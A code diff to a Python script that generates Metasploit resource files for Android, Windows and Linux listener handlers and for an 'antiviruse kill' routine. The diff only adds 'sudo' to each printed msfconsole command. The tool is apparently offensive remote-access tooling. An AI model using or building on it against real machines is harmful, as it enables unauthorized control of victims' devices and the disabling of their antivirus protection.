@@ -35,7 +35,7 @@ def android ():
      with open("android.txt",'w') as andp:
         andp.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
         time.sleep(5)
-        print(" run commnad msfconsole -r android.txt")
+        print(" run commnad sudo  msfconsole -r android.txt")
  # ====================================================       
 def windows():        
      ip = input('Enter ip address :-')
@@ -51,7 +51,7 @@ def windows():
      with open("windows.txt",'w') as andp:
         andp.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
         time.sleep(5)
-        print("run command msfconsole -r windows.txt")
+        print("run command sudo msfconsole -r windows.txt")
 # ======================================        
 def linux():        
      ip = input('Enter ip address :-')
@@ -67,7 +67,7 @@ def linux():
      with open("linux.txt",'w') as andp:
         andp.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
         time.sleep(5)     
-        print("run command  msfconsole -r linux.txt")
+        print("run command sudo  msfconsole -r linux.txt")
  # ============================================================       
 #antiviruse kill 
 def windowkill():
@@ -84,7 +84,7 @@ def windowkill():
     with open("wndowkill.txt",'w') as kill:
         kill.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
         time.sleep(5)
-        print("run command msfconsole -r windowkill.txt")         #================================================
+        print("run command sudo  msfconsole -r windowkill.txt")         #================================================
 def main ():        
      print("metasploit fremwork")
      print("enter ip addres ex 127.0.0.1")
